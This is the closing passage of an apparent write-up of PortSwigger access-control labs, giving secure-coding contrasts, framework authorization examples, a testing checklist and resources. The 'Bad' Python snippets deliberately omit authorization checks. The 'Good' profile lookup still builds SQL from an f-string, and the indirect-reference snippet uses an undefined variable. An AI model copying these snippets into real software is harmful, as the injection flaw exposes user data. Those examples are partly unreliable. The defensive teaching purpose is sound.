**Layer 4: Monitoring**
- Access logging
- Anomaly detection
- Alert on suspicious patterns
- Security incident response

### Secure Coding Practices

**1. Server-Side Authorization**
```python
# Bad - trusts client data
def get_user_profile(user_id):
    return db.query(f"SELECT * FROM users WHERE id={user_id}")

# Good - validates authorization
def get_user_profile(user_id, session_user):
    if user_id != session_user.id and not session_user.is_admin:
        raise UnauthorizedException()
    return db.query(f"SELECT * FROM users WHERE id={user_id}")
```

**2. Indirect Object References**
```python
# Bad - direct reference
url = f"/download/{file_id}"

# Good - indirect reference
file_mapping = {
    "abc123": "file_001.txt",  # User can only see abc123
    "def456": "file_002.txt"
}
url = f"/download/{mapping_id}"
```

**3. Consistent Authorization**
```python
# Bad - only checks POST
@app.route('/admin-roles', methods=['POST'])
@require_admin
def upgrade_user_post():
    # ...

# Good - checks all methods
@app.route('/admin-roles', methods=['POST', 'GET', 'PUT'])
@require_admin
def upgrade_user():
    # ...
```

**4. Multi-Step Validation**
```python
# Bad - only checks first step
def step1(user):
    if not is_admin(user):
        return "Unauthorized"
    return render_confirmation()

def step2():  # No check!
    perform_action()

# Good - validates every step
def step1(user):
    if not is_admin(user):
        return "Unauthorized"
    return render_confirmation()

def step2(user):
    if not is_admin(user):  # Re-validate!
        return "Unauthorized"
    perform_action()
```

### Framework-Specific Protections

**Django:**
```python
from django.contrib.auth.decorators import permission_required

@permission_required('app.can_delete_user')
def delete_user(request, user_id):
    # Function only executes if user has permission
    pass
```

**Spring (Java):**
```java
@PreAuthorize("hasRole('ADMIN')")
@RequestMapping("/admin-roles")
public String upgradeUser() {
    // Method-level security
}
```

**Express.js (Node):**
```javascript
function requireAdmin(req, res, next) {
    if (!req.user.isAdmin) {
        return res.status(403).json({ error: 'Forbidden' });
    }
    next();
}

app.post('/admin-roles', requireAdmin, upgradeUser);
app.get('/admin-roles', requireAdmin, upgradeUser);
```

### Testing for Access Control Issues

**Manual Testing Checklist:**
- [ ] Test with different user privilege levels
- [ ] Try accessing other users' resources (IDOR)
- [ ] Test all HTTP methods (GET, POST, PUT, DELETE)
- [ ] Examine redirect response bodies
- [ ] Check for privilege parameters in requests
- [ ] Test multi-step processes independently
- [ ] Verify authorization on every endpoint
- [ ] Look for hidden admin functionality
- [ ] Test with expired/invalid sessions

**Automated Testing:**
- OWASP ZAP with access control testing
- Burp Suite Scanner (Pro)
- Custom scripts for IDOR enumeration
- CI/CD integration for regression testing

---

## Conclusion

Access control vulnerabilities represent one of the most critical security issues in web applications, consistently ranking #1 in the OWASP Top 10. These 13 labs demonstrate the wide variety of access control flaws that can occur:

**Key Lessons:**
1. Never trust client-side data for authorization
2. Implement authorization checks server-side only
3. Validate permissions on every request
4. Use framework-provided security features
5. Test access controls with different user contexts
6. Apply defense in depth
7. Monitor and log access patterns

**Attack Surface:**
- URLs and parameters
- Cookies and headers
- HTTP methods
- Multi-step processes
- File references
- API endpoints

**Defense Strategy:**
- Deny by default
- Centralized authorization logic
- Principle of least privilege
- Regular security testing
- Security awareness training

By understanding these vulnerabilities and exploitation techniques, security professionals can better identify and remediate access control flaws in production applications.

---

## Additional Resources

### PortSwigger Resources
- Access Control Vulnerability Guide: https://portswigger.net/web-security/access-control
- All Labs: https://portswigger.net/web-security/all-labs
- Burp Suite Documentation: https://portswigger.net/burp/documentation

### OWASP Resources
- OWASP Top 10 A01:2021 - Broken Access Control
- OWASP Testing Guide - Authorization Testing
- OWASP Access Control Cheat Sheet

### Tools
- Burp Suite Professional/Community
- OWASP ZAP
- Autorize (Burp Extension)
- AuthMatrix (Burp Extension)

### CVE Databases
- NIST National Vulnerability Database
- MITRE CVE
- Exploit-DB

---

**Document Version:** 1.0
**Last Updated:** 2025
**Total Labs Covered:** 13
**Difficulty Levels:** Apprentice (5), Practitioner (8)
